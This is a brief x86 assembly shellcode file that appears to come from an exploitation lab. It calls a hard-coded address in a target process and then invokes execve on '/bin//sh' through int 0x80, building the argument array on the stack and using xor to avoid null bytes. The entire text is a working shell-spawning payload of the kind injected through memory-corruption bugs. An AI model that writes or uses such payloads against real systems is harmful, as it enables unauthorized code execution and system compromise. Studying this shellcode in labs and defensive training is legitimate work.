section .text
global _start
_start:

xor ebx,ebx
mov ebx,0x565562e5
call ebx
xor ebx,ebx

; Store the argument string on stack
xor eax, eax
push eax ; Use 0 to terminate the string
push "//sh" ; 
push "/bin"
mov ebx, esp ; Get the string address
; Construct the argument array argv[]
push eax ; argv[1] = 0 
push ebx ; argv[0] points to the cmd string 
mov ecx, esp ; Get the address of argv[]
; For environment variable
xor edx, edx ; No env variable 
; Invoke execve()
xor eax, eax ; eax = 0x00000000
mov al, 0x0b ; eax = 0x0000000b
int 0x80
